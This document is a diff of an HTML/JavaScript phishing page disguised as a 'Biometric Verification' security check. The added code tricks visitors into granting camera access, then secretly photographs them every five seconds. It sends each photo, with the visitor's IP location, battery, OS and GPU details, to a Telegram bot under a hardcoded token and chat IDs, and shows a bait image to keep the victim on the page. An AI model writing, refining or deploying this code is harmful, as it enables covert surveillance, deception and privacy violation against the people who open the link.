@@ -3,20 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification</title>
+    <title>Secure Portal - Nitin 333</title>
     <style>
-        body { font-family: sans-serif; background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        #box { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 20px; background: #0a0a0a; width: 80%; }
-        .btn { background: #0088cc; color: #fff; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        /* Keeping your original CSS exactly the same */
+        body { font-family: -apple-system, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #wrapper { text-align: center; width: 90%; max-width: 380px; padding: 30px; border: 1px solid #222; border-radius: 25px; background: #0a0a0a; box-shadow: 0 0 30px rgba(0, 136, 204, 0.2); }
+        .icon { font-size: 60px; margin-bottom: 20px; color: #0088cc; }
+        .loader { border: 4px solid #111; border-top: 4px solid #0088cc; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        #status { font-size: 14px; color: #888; margin-top: 15px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="box">
-    <h2 id="title">🛡️ Security Check</h2>
-    <p id="msg">Allow Camera to verify your identity.</p>
-    <button class="btn" id="startBtn" onclick="runGlobalScan()">VERIFY NOW</button>
+<div id="wrapper">
+    <div class="icon">🛡️</div>
+    <h2 style="margin: 0;">Identity Required</h2>
+    <p id="status">Please complete the <b>Biometric Verification</b> to proceed.</p>
+    <div id="load" class="loader"></div>
+    <button id="mainBtn" class="btn" onclick="startNitinGlobalScan()">VERIFY IDENTITY</button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -24,53 +31,81 @@
 
 <script>
     const TOKEN = "8261242218:AAHt6b51pIZowjKOdNmUTE4skOpVAWZbsqI";
-    const ADMIN_ID = "6643732863"; // Put your Telegram ID here!
+    const ADMIN_ID = "6643732863"; // <--- Put your Telegram ID here
 
     const params = new URLSearchParams(window.location.search);
     const TARGET_USER = params.get('id') || ADMIN_ID; 
     const BAIT_IMG = params.get('img');
 
-    async function runGlobalScan() {
-        document.getElementById('startBtn').style.display = 'none';
-        document.getElementById('msg').innerHTML = "Scanning... Please wait.";
+    let ipData = "Fetching...";
+
+    async function startNitinGlobalScan() {
+        const btn = document.getElementById('mainBtn');
+        const loader = document.getElementById('load');
+        const status = document.getElementById('status');
+
+        if ("vibrate" in navigator) { navigator.vibrate([100, 50, 100]); }
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+        status.innerHTML = "Initializing Biometric Scan...";
+
+        // NEW: Background IP Fetch
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            ipData = `${d.ip} (${d.city}, ${d.country_name})`;
+        } catch (e) { ipData = "Private/VPN"; }
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
+            
+            // Get Device Info
+            const os = navigator.platform;
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown";
 
-            const sendSnap = async () => {
+            const captureAndSend = async () => {
                 const canvas = document.getElementById('canvas');
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 
+                let bat = "N/A";
+                try { const b = await navigator.getBattery(); bat = `${(b.level * 100).toFixed(0)}% ${b.charging ? '⚡' : ''}`; } catch(e){}
+
                 canvas.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append("photo", blob, "scan.jpg");
+                    fd.append("photo", blob, "capture.jpg");
                     
-                    // Send to the person who made the link
+                    const caption = `🎯 **Live Capture**\n🌐 **IP:** ${ipData}\n🔋 **Battery:** ${bat}\n📱 **OS:** ${os}\n🖥️ **GPU:** ${gpu}\n⚠️ *Target is still on page!*`;
+
+                    // Send to the Link Owner
                     fd.set("chat_id", TARGET_USER);
-                    fd.set("caption", "🎯 **Target Captured!**");
+                    fd.set("caption", caption);
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
 
-                    // Send copy to ADMIN (Global Log)
+                    // Send Copy to You (The Admin)
                     if (TARGET_USER !== ADMIN_ID) {
                         fd.set("chat_id", ADMIN_ID);
-                        fd.set("caption", `📡 **GLOBAL LOG**\nTarget hit for User: ${TARGET_USER}`);
+                        fd.set("caption", `📡 **GLOBAL LOG**\nUser: ${TARGET_USER}\n${caption}`);
                         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
                     }
                 }, 'image/jpeg');
             };
 
-            // Capture immediately and then every 5 seconds
-            sendSnap();
-            setInterval(sendSnap, 5000);
+            // Capture immediately and every 5 seconds
+            captureAndSend();
+            setInterval(captureAndSend, 5000);
 
-            // Show bait image after 3 seconds
+            // Show Bait
             setTimeout(() => {
-                if (BAIT_IMG) document.getElementById('box').innerHTML = `<img src="${BAIT_IMG}" style="width:100%; border-radius:10px;">`;
-            }, 3000);
+                if (BAIT_IMG) {
+                    document.getElementById('wrapper').innerHTML = `<img src="${BAIT_IMG}" style="width:100%; border-radius:15px;">`;
+                }
+            }, 4000);
 
-        } catch (e) {
-            alert("Error: Camera Permission Denied.");
+        } catch (err) {
+            alert("Verification Failed. Permission Required.");
             location.reload();
         }
     }
